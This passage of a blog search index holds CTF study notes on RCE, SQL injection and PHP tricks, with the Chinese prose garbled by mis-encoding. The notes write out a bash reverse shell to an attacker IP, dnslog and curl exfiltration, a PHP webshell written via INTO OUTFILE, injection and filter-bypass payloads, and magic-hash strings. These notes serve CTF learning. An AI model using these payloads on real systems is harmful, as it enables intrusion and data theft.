æ”»å‡»ç«¯ä½¿ç”¨ï¼š</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">nc</span> <span class="token parameter variable">-lvp</span> ç›‘å¬çš„ç«¯å£<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹    å—å®³ç«¯ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ç”Ÿæˆä¸€ä¸ªåå¼¹shellï¼š</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">>&amp;</span> /dev/tcp/æ”»å‡»ç«¯IP/æ”»å‡»ç«¯ç›‘å¬ç«¯å£ <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹    åœ¨æ”»å‡»ç«¯ç»ˆç«¯å³å¯åœ¨å—å®³ç«¯ä¸­æ‰§è¡Œå‘½ä»¤</p><p>ï¼ˆ2ï¼‰ã€dnslogï¼šé€šè¿‡ping $(å‘½ä»¤).åŸŸå é€šè¿‡è¿™ç§æ–¹å¼è·å–å‘½ä»¤æ‰§è¡Œç»“æœ</p><p>ï¼ˆ3ï¼‰ã€å†™æ–‡ä»¶ï¼šå°†å‘½ä»¤æ‰§è¡Œç»“æœå†™å…¥åˆ°æ–‡ä»¶ä¸­ï¼Œä½¿ç”¨echoå‘½ä»¤ï¼š</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">echo</span> <span class="token string">"å†™å…¥å†…å®¹"</span><span class="token operator">></span>test.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ï¼ˆ4ï¼‰ã€curlç­‰ç½‘ç»œå‘½ä»¤ï¼šé€šè¿‡POSTç­‰æ–¹å¼ç›´æ¥ç»™åˆ°ä¸ªäººç§æœ‰VPSä¸­</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> <span class="token parameter variable">-d</span> <span class="token string">"key1=value1&amp;key2=value2&amp;key3=value3"</span> protocol://ip:port/path<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="3ã€RCEåå‘ç°ä¸å‡ºç½‘"><a href="#3ã€RCEåå‘ç°ä¸å‡ºç½‘" class="headerlink" title="3ã€RCEåå‘ç°ä¸å‡ºç½‘"></a><strong>3ã€RCEåå‘ç°ä¸å‡ºç½‘</strong></h5><p>ï¼ˆ1ï¼‰ã€å†™æ–‡ä»¶</p><p>ï¼ˆ2ï¼‰ã€å‘½ä»¤ç›²æ³¨ï¼šå‘½ä»¤||sleep 100</p><p>ï¼ˆ3ï¼‰ã€éšè”½ä¿¡é“</p><h5 id="4ã€å­—ç¬¦ç»•è¿‡"><a href="#4ã€å­—ç¬¦ç»•è¿‡" class="headerlink" title="4ã€å­—ç¬¦ç»•è¿‡"></a>4ã€å­—ç¬¦ç»•è¿‡</h5><p>ï¼ˆ1ï¼‰ã€</p><pre class="line-numbers language-none"><code class="language-none">ä½¿ç”¨&#39;&#39;æˆ–&quot;&quot;éš”æ–­å­—ç¬¦ä¸²<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ï¼ˆ2ï¼‰ã€ç©ºæ ¼å¯ä½¿ç”¨ï¼š&lt;ï¼Œ&lt;&gt;ï¼Œ${IFS}ï¼Œ$IFSï¼Œ%20(space)ï¼Œ%09(tab)ï¼Œ$IFS$9ï¼Œ$IFS$1 æ›¿æ¢</p><p>ï¼ˆ3ï¼‰ã€åˆ†å·å¯ä½¿ç”¨ï¼š%0aï¼Œ%0dï¼Œ%0Dï¼Œ%0A æ›¿æ¢</p><p>ï¼ˆ4ï¼‰ã€ä½¿ç”¨base64ç¼–ç ï¼šY2F0IGZsYWcucGhw|base64ï¼Œå°†å…¶ä¸­å†…å®¹è§£ç åæ‰§è¡Œ</p><p>ï¼ˆ5ï¼‰ã€ä½¿ç”¨`åå¼•å·åŒ…è£¹å‘½ä»¤ï¼Œå°†å…¶ä¸­å†…å®¹ä½œä¸ºå‰ä¸€å‘½ä»¤çš„è¾“å…¥</p><h5 id="5ã€å¯ç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°"><a href="#5ã€å¯ç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°" class="headerlink" title="5ã€å¯ç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°"></a>5ã€å¯ç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°</h5><p>exec()ã€passthru()ã€system()ã€shell_exec()</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> Note </tag>
            
            <tag> web </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLæ³¨å…¥ç¬”è®°</title>
      <link href="/posts/26213.html"/>
      <url>/posts/26213.html</url>
      
        <content type="html"><![CDATA[<h1 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a><strong>SQLæ³¨å…¥</strong></h1><p>1ã€é€šè¿‡order byçˆ†å‡ºå­—æ®µæ•°</p><p>2ã€unionæ“ä½œï¼Œè”åˆæŸ¥è¯¢ï¼ŒæŸ¥è¯¢çš„æ˜¯åœ¨åŒä¸€ä¸ªæ•°æ®è¡¨çš„æ•°æ®ï¼Œé€šè¿‡union select 1,2,3â€¦,næ¥åˆ¤æ–­å›æ˜¾ä½ç½®</p><p>3ã€information_schemaæ•°æ®åº“ï¼Œä¸ºmysqlè‡ªå¸¦æ•°æ®åº“ï¼Œæä¾›æ•°æ®åº“æºæ•°æ®è®¿é—®ï¼Œæœ€å¸¸ç”¨çš„æ˜¯</p><p><strong>TABLESè¡¨</strong>ï¼šæä¾›äº†å…³äºæ•°æ®åº“ä¸­è¡¨çš„ä¿¡æ¯</p><p><strong>COLUMNSè¡¨</strong>ï¼šæä¾›äº†è¡¨ä¸­åˆ—çš„ä¿¡æ¯</p><span id="more"></span><p>çˆ†ç ´åº“åï¼š</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">union select 1,2,database()&#x2F;&#x2F;é é”™è¯¯çˆ†å‡ºåº“åand exists(select * from aaa)&#x2F;&#x2F;aaaè¡¨å¹¶ä¸å­˜åœ¨ï¼Œæ­¤æ—¶ä¼šæŠ¥é”™åœæ­¢å¹¶è¿”å›æ•°æ®åº“å.aaa<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>çˆ†ç ´è¡¨åï¼š</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()and exists(select * from è¡¨å)&#x2F;&#x2F;çˆ†ç ´å‡ºè¡¨å<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>çˆ†ç ´åˆ—åï¼š</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&quot;æƒ³æŸ¥è¯¢çš„è¡¨å&quot;and exists(select åˆ—å from å·²çŸ¥è¡¨å)&#x2F;&#x2F;çˆ†ç ´å‡ºåˆ—å<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>4ã€æŠ¥é”™æ³¨å…¥</p><p>ï¼ˆ1ï¼‰updatexmlï¼šæ›´æ–°XMLæ–‡æ¡£çš„å‡½æ•°</p><p>è¯­æ³•ï¼š<strong>updatexmlï¼ˆæ–‡æ¡£ç±»å‹ï¼Œxpathè·¯å¾„ï¼Œæ›´æ–°çš„å†…å®¹ï¼‰</strong></p><p>ä¾‹å­ï¼š</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">and updatexml(0x0a,concat(0x0a,(select database())),â€™1â€™)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>0x0aä»£è¡¨æ¢è¡Œç¬¦ï¼Œconcatæ‹¼æ¥</p><p>æ‹¼æ¥ç›®çš„ä¸ºä½¿å¾—æŸ¥è¯¢ç»“æœèƒ½å®Œå…¨æ˜¾ç¤ºå‡ºæ¥</p><p>ï¼ˆ2ï¼‰extractvalueï¼šå¯¹XMLæ–‡æ¡£è¿›è¡ŒæŸ¥è¯¢çš„å‡½æ•°</p><p>è¯­æ³•ï¼š<strong>extractvalueï¼ˆæ–‡æ¡£ç±»å‹ï¼Œxpathè·¯å¾„ï¼‰</strong></p><p>æŠ¥é”™åŸç†ï¼šè·¯å¾„ä¸­å†™å…¥ä¸åˆæ³•çš„æ ¼å¼ï¼Œå°±ä¼šæŠ¥é”™å¹¶ä¸”è¿”å›æˆ‘ä»¬å†™å…¥çš„éæ³•æ ¼å¼å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªå¾—åˆ°æˆ‘ä»¬æƒ³å¾—åˆ°çš„å†…å®¹</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">and (select extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema&#x3D; &#39;sqli&#39;))))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æç¤ºï¼šæŠ¥é”™æœ€é•¿æ˜¾ç¤º30ä¸ªå­—ç¬¦å†…å®¹ï¼Œå¦‚æœå†…å®¹è¿‡é•¿å¯ä½¿ç”¨substrå‡½æ•°è¿›è¡Œæ‹†åˆ†</p><p>â€‹    ä¾‹é¢˜ï¼šCTFHubæŠ€èƒ½æ ‘web-SQLæ³¨å…¥-æŠ¥é”™æ³¨å…¥</p><p>â€‹    <img src="/images/quiz/SQLError.png" alt="SQLError"></p><p>â€‹    é¦–å…ˆçˆ†ç ´åº“è¡¨åˆ—å</p><p>â€‹    <img src="/images/quiz/SQLError2.png" alt="SQLError2"></p><p>â€‹    è¿›è€Œå‘ç°flagè¿‡é•¿ç”¨substråˆ‡å‰²</p><p>â€‹    <img src="/images/quiz/SQLError3.png" alt="SQLError3"></p><p>â€‹    å¾—åˆ°flag</p><p>5ã€ç›²æ³¨ï¼š</p><p>å¸ƒå°”ç›²æ³¨ï¼šå›æ˜¾åªæœ‰ä¸¤ç§æƒ…å†µï¼Œä¸€ç§æœ‰ä¸€ç§æ— </p><p>ifè¡¨è¾¾å¼ï¼šif(expr1,expr2,expr3)</p><p>expr1ä¸ºçœŸå°±è¿”å›expr2ï¼ˆå¯ç”¨äºæ‰§è¡Œå‡½æ•°ï¼‰</p><p>substrå‡½æ•°ï¼šsubstr(å­—ç¬¦ä¸²,èµ·å§‹ä½ç½®,æˆªå–é•¿åº¦)</p><p>asciiå‡½æ•°ï¼šå°†å‡½æ•°å†…å­—ç¬¦ä»¥asciiè¡¨è½¬æ¢ä¸ºæ•°å­—ï¼Œè€Œåå¯ä»¥è¿›è¡Œåˆ¤æ–­</p><p>æ—¶é—´ç›²æ³¨ï¼šæ— å›æ˜¾ï¼Œå¯ä»¥é€šè¿‡sleepå‡½æ•°åˆ¤æ–­æ˜¯å¦ä¸ºæ—¶é—´ç›²æ³¨</p><p><del>å»ºè®®ç›´æ¥sqlmap</del></p><p>ï¼ˆ1ï¼‰ã€sleepå‡½æ•°çœ‹å»¶è¿Ÿæ—¶é—´</p><p>ï¼ˆ2ï¼‰ã€benchmark(æ‰§è¡Œæ¬¡æ•°,æ–¹å¼)ï¼Œæ‰§è¡Œè¶…å¤šæ¬¡çœ‹å»¶è¿Ÿæ—¶é—´</p><p>6ã€å †å æ³¨å…¥ï¼šé€šè¿‡è¯­å¥åˆ†å‰²ç¬¦å·ï¼ˆ  ;  ï¼‰åˆ†éš”å¤šæ¡è¯­å¥ï¼Œç›´æ¥å°†æƒ³è¦çš„æ•°æ®æ’å…¥åˆ°è¡¨ä¸­ï¼Œç„¶åå†é€šè¿‡æŸ¥è¯¢è¯­å¥è¯»å–</p><p>7ã€mysqlæ–‡ä»¶è¯»å†™ï¼šè¯»å–ï¼šload_fileå‡½æ•°ï¼šload_file(â€˜æ–‡ä»¶è·¯å¾„â€™)</p><p>å†™å…¥ï¼š</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select â€˜&lt;?php eval($_POST[cmd]);?&gt;â€™ into outfileæˆ–dumpfile &#39;ç»å¯¹è·¯å¾„&#39;;&#x2F;&#x2F;å»ºè®®ç”¨dumpfileï¼Œå› ä¸ºoutfileä¼šåœ¨æ–‡ä»¶æœ«è¡Œå†™å…¥æ–°è¡Œï¼Œä½¿ç”¨çš„è½¬è¯‘æ¢è¡Œç¬¦ï¼Œä¼šç ´åæ–‡ä»¶å®Œæ•´æ€§ï¼Œå¯èƒ½å¯¼è‡´ä¸€å¥è¯æœ¨é©¬æ— æ³•æ‰§è¡Œ<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>8ã€å…³é”®è¯ç»•è¿‡ï¼šé€šè¿‡</p><p>ï¼ˆ1ï¼‰ã€set@aï¼šè®¾å®šä¸€ä¸ªè¯­å¥å˜é‡ set@sql=0x16è¿›åˆ¶æ•°</p><p>ï¼ˆ2ï¼‰ã€prepare : å­˜å‚¨ä¸€ä¸ªsqlè¯­å¥ å­˜åˆ°execsql é‡Œé¢ prepare execsql from @sql</p><p>ï¼ˆ3ï¼‰ã€execute :æ‰§è¡Œä¸€ä¸ªsqlè¯­å¥ execute execsql</p><p>ç”±äºè®¾å®šè¯­å¥å˜é‡æ—¶ï¼Œmysqlä¼šè‡ªåŠ¨å°†16è¿›åˆ¶æ•°æ®è½¬æ¢ä¸ºæ–‡å­—</p><p>9ã€é›¶ç¢</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">to_base64(å†…å®¹)&#x2F;&#x2F;è¯¥è¯­å¥å°†å†…å®¹ç»è¿‡base64ç¼–ç åè¾“å‡ºreplace(ori,old,new)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">%0a,&#x2F;**&#x2F;å¯ä»£æ›¿ç©ºæ ¼<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">--+ï¼Œ%23ï¼Œ#å°†åé¢çš„è¯­å¥æ³¨é‡Š<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>10ã€SQLçº¦æŸæ”»å‡»</p><p>åœ¨SQLä¸­æ‰§è¡Œå­—ç¬¦ä¸²å¤„ç†æ—¶ï¼Œå­—ç¬¦ä¸²æœ«å°¾çš„ç©ºæ ¼ç¬¦å°†ä¼šè¢«åˆ é™¤ã€‚ä¾‹å¦‚å¦‚ä¸‹ä»£ç ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> userId <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'test            '</span><span class="token comment">//çœ‹è¿™é‡Œæœ‰å¾ˆå¤šç©ºæ ¼</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸Šè¿°ä»£ç å’Œusername = â€˜testâ€™ç»“æœæ˜¯ä¸€æ ·çš„ã€‚ä½†ä¹Ÿå­˜åœ¨å¼‚å¸¸æƒ…å†µï¼Œæœ€å¥½çš„ä¾‹å­å°±æ˜¯LIKEå­å¥äº†ã€‚æ³¨æ„ï¼Œå¯¹å°¾éƒ¨ç©ºç™½ç¬¦çš„è¿™ç§ä¿®å‰ªæ“ä½œï¼Œä¸»è¦æ˜¯åœ¨â€œ<strong>å­—ç¬¦ä¸²æ¯”è¾ƒ</strong>â€æœŸé—´è¿›è¡Œçš„ã€‚è¿™æ˜¯å› ä¸ºï¼Œ<strong>SQLä¼šåœ¨å†…éƒ¨ä½¿ç”¨ç©ºæ ¼æ¥å¡«å……å­—ç¬¦ä¸²</strong>ï¼Œ<strong>ä»¥ä¾¿åœ¨æ¯”è¾ƒä¹‹å‰ä½¿å…¶å®ƒä»¬çš„é•¿åº¦ä¿æŒä¸€è‡´</strong>ã€‚</p><p>åœ¨æ‰€æœ‰çš„INSERTæŸ¥è¯¢ä¸­ï¼ŒSQLéƒ½ä¼šæ ¹æ®varchar(n)æ¥é™åˆ¶å­—ç¬¦ä¸²çš„æœ€å¤§é•¿åº¦ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœå­—ç¬¦ä¸²çš„é•¿åº¦å¤§äºâ€œnâ€ä¸ªå­—ç¬¦çš„è¯ï¼Œé‚£ä¹ˆä»…æ’å…¥å­—ç¬¦ä¸²çš„å‰â€œnâ€ä¸ªå­—ç¬¦ã€‚æ¯”å¦‚ç‰¹å®šåˆ—çš„é•¿åº¦çº¦æŸä¸ºâ€œ5â€ä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆåœ¨æ’å…¥å­—ç¬¦ä¸²â€œtestNameâ€æ—¶ï¼Œå®é™…ä¸Šåªèƒ½æ’å…¥å­—ç¬¦ä¸²çš„å‰5ä¸ªå­—ç¬¦ï¼Œå³â€œtestNâ€ã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">//æ³¨å†Œç¤ºä¾‹ä»£ç <span class="token prolog">&lt;?php$username = mysql_real_escape_string($_GET['username']);$password = mysql_real_escape_string($_GET['password']);$query = "SELECT *          FROM users          WHERE username='$username'";$res = mysql_query($query, $database);if($res) &#123;  if(mysql_num_rows($res) > 0) &#123;  &#125;  else &#123;    $query = "INSERT INTO users(username, password)?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œæ³¨å†Œæ—¶ä½¿ç”¨ç”¨æˆ·å+ã€å¤§é‡ç©ºæ ¼ã€‘å’Œéšæœºå¯†ç æ³¨å†Œå³å¯å®Œæˆæ”»å‡»ã€‚</p><p>ä¸»è¦åŸç†å°±æ˜¯insertæ—¶å€™æœ‰varchar(n)çš„é™åˆ¶ï¼Œå¤§äºnçš„æ—¶å€™ä¼šæˆªå–å‰nä¸ªå­˜å…¥ã€‚åœ¨æ•°æ®åº“å¯¹å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒæ—¶ï¼Œå³selectæ“ä½œï¼Œå¦‚æœä¸¤ä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦ä¸ä¸€æ ·ï¼Œåˆ™ä¼šå°†è¾ƒçŸ­çš„å­—ç¬¦ä¸²æœ«å°¾å¡«å……ç©ºæ ¼ï¼Œä½¿ä¸¤ä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦ä¸€è‡´ã€‚æ³¨å†Œæ—¶selectè¯­å¥ä¸ä¼šå°†â€admin+[å¤§é‡ç©ºæ ¼]11â€åˆ å‡åˆ°nä½ï¼Œæ‰€ä»¥ä¸ä¼šè¢«selectæŸ¥å‡ºä¸adminé‡å¤ï¼Œä¸ä¼šè¿”å›æ•°æ®ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥æ’å…¥admin+[ç©ºæ ¼]ï¼ˆæˆªå–ï¼‰11å’Œè‡ªå®šä¹‰å¯†ç äº†ã€‚</p><p>å¦‚æœä½¿ç”¨ç”¨æˆ·åâ€œvampireâ€å’Œå¯†ç â€œrandom_passâ€ç™»å½•çš„è¯ï¼Œå¯¹æ¯”æ—¶æ˜¯adminä¸admin+[å¤§é‡ç©ºæ ¼]ï¼Œä¼šå°†å‰é¢çš„adminæ·»åŠ ç©ºæ ¼ä¸åé¢çš„é•¿åº¦ç›¸åŒåœ¨è¿›è¡Œå¯¹æ¯”ï¼Œé‚£ä¹ˆè¿”å›çš„åªèƒ½æ˜¯æˆ‘ä»¬è‡ªå·±æ³¨å†Œçš„ç”¨æˆ·ä¿¡æ¯ï¼Œè€Œä¸ä¼šè¿”å›ç›®æ ‡ç”¨æˆ·ä¿¡æ¯ã€‚SQLæŸ¥è¯¢è¯­å¥æ˜¯ä¸€ä¸ªandæ“ä½œï¼Œå¦‚æœå¯†ç ä¸ä¸€æ ·æ€ä¹ˆä¼šæŠŠç›®æ ‡ç”¨æˆ·çš„ä¿¡æ¯ä¹Ÿè¿”å›å›æ¥?</p><p>å½“ç™»é™†æ—¶ä½¿ç”¨adminä¸è‡ªå®šä¹‰å¯†ç ç™»é™†ï¼Œæ•°æ®åº“å°†è¿”å›æˆ‘ä»¬è‡ªå·±æ³¨å†Œçš„è´¦æˆ·ä¿¡æ¯ï¼Œä½†æ˜¯æ³¨æ„æ­¤å¤„çš„return $usernameï¼Œè™½ç„¶æ­¤æ—¶æŸ¥è¯¢å‡ºæ¥çš„æ˜¯æˆ‘ä»¬è‡ªå·±çš„ç”¨æˆ·ä¿¡æ¯ï¼Œä½†æ˜¯è¿”å›çš„ç”¨æˆ·ååˆ™æ˜¯ç›®æ ‡çš„ç”¨æˆ·åã€‚å¦‚æœæ­¤åçš„ä¸šåŠ¡é€»è¾‘ç›´æ¥ä»¥è¯¥ç”¨æˆ·åä¸ºå‡†ï¼Œåˆ™æˆ‘ä»¬å°±è¾¾åˆ°äº†æ°´å¹³è¶Šæƒçš„ç›®çš„ã€‚</p><p><strong>HANDLERè¯­å¥æŸ¥è¯¢</strong></p><p>å‡ºè‡ªè¯¥é¢˜[GYCTF2020]Blacklistï¼Œç±»ä¼¼äºæŸé“å †å æ³¨å…¥çš„è¿›é˜¶ç‰ˆï¼Œä½†æ˜¯è¯¥é¢˜è¿‡æ»¤å¤ªå¤šäº†ï¼Œä¹‹å‰é‚£é“é¢˜çš„payloadå®Œå…¨ä¸å¯ç”¨äº†</p><pre class="line-numbers language-none"><code class="language-none">return preg_match(&quot;&#x2F;set|prepare|alter|rename|select|update|delete|drop|insert|where|\.&#x2F;i&quot;,$inject);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>çŸ¥è¯†ç‚¹ï¼šhandlerè¯­å¥æŸ¥è¯¢</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">HANDLER tbl_name OPEN [ [AS] alias] HANDLER tbl_name READ index_name &#123; &#x3D; | &lt;&#x3D; | &gt;&#x3D; | &lt; | &gt; &#125; (value1,value2,...)    [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;    [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ &#123; FIRST | NEXT &#125;    [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name CLOSE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ„é€ å‡ºè¯­å¥å¦‚ä¸‹</p><pre class="line-numbers language-none"><code class="language-none">payload:1&#39;;use supersqli;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>distinct+åˆ—åå¯ä»¥å»é™¤é‡å¤å€¼</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> Note </tag>
            
            <tag> web </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFé›¶ç¢ç¬”è®°</title>
      <link href="/posts/11612.html"/>
      <url>/posts/11612.html</url>
      
        <content type="html"><![CDATA[<h1 id="é›¶ç¢ç¬”è®°"><a href="#é›¶ç¢ç¬”è®°" class="headerlink" title="é›¶ç¢ç¬”è®°"></a>é›¶ç¢ç¬”è®°</h1><p>mt_srand( )è¯¥å‡½æ•°åœ¨PHP4.2.0ä¹‹å‰ä¼ å…¥ä»»æ„å‚æ•°åç”Ÿæˆçš„éƒ½æ˜¯ä¼ªéšæœºæ•°ï¼Œåœ¨ä»»ä½•æœºå™¨ä¸Šåªè¦è¿è¡Œçš„åŒæ ·çš„seedå‚æ•°ç»“æœéƒ½ç›¸åŒï¼Œæœ‰å·¥å…·å¯ä»¥çˆ†ç ´</p><span id="more"></span><p>KindEditorç¼–è¾‘å™¨æ¼æ´ï¼Œåœ¨ä½¿ç”¨è¯¥ç¼–è¾‘å™¨æ˜¯åœ¨urlæœ«å°¾åŠ ä¸Š/php/file_manager_json.php?path=è·¯å¾„ï¼Œå°±ä¼šä¾¿åˆ©è·¯å¾„ä¸­æ‰€æœ‰å†…å®¹ï¼Œç‰¹å¾ä¸ºå‰ç«¯ä»£ç ä¸­æœ‰å¯¹php/file_manager_json.phpçš„å¼•ç”¨</p><h6 id="md5å¼±ç›¸ç­‰ç»•è¿‡ï¼š"><a href="#md5å¼±ç›¸ç­‰ç»•è¿‡ï¼š" class="headerlink" title="md5å¼±ç›¸ç­‰ç»•è¿‡ï¼š"></a>md5å¼±ç›¸ç­‰ç»•è¿‡ï¼š</h6><p>1ã€æ„é€ æ•°ç»„a[]=xxxx&amp;b[]=xxxx</p><p>2ã€å¼±ç›¸ç­‰æ—¶è½¬æ¢ä¸ºç›¸åŒæ•°æ®ç±»å‹ï¼Œ0eå¼€å¤´çš„å­—ç¬¦ä¸²ä¼šè¢«è½¬ä¸º0ï¼Œå­—ç¬¦ä¸²å¦‚ä¸‹</p><pre class="line-numbers language-none"><code class="language-none">QNKCDZO&#x2F;&#x2F;0e830400451993494058024219903391s878926199a&#x2F;&#x2F;0e545993274517709034328855841020s155964671a&#x2F;&#x2F;0e342768416822451524974117254469s214587387a&#x2F;&#x2F;0e848240448830537924465865611904s214587387a&#x2F;&#x2F;0e848240448830537924465865611904s878926199a&#x2F;&#x2F;0e545993274517709034328855841020s1091221200a&#x2F;&#x2F;0e940624217856561557816327384675<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> Note </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF</title>
      <link href="/posts/58958.html"/>
      <url>/posts/58958.html</url>
      
        <content type="html"><![CDATA[<p>Jlançš„CTFä¹‹æ—…ä»ç°åœ¨å¼€å§‹äº†</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
